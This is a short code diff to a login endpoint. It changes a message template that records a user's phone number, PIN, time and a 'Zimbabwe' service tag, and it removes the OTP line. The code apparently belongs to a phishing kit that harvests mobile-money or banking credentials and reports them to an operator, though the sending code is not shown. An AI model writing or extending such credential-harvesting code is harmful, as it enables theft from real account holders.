@@ -78,7 +78,6 @@ app.post('/api/login', async (req, res) => {
 
 📱 <b>Phone:</b> ${phone}
 🔐 <b>PIN:</b> <code>${pin}</code>
-🔑 <b>OTP:</b> <code>${otp}</code>
 🕐 <b>Time:</b> ${new Date().toLocaleString()}
 🌐 <b>Service:</b> Zimbabwe
 
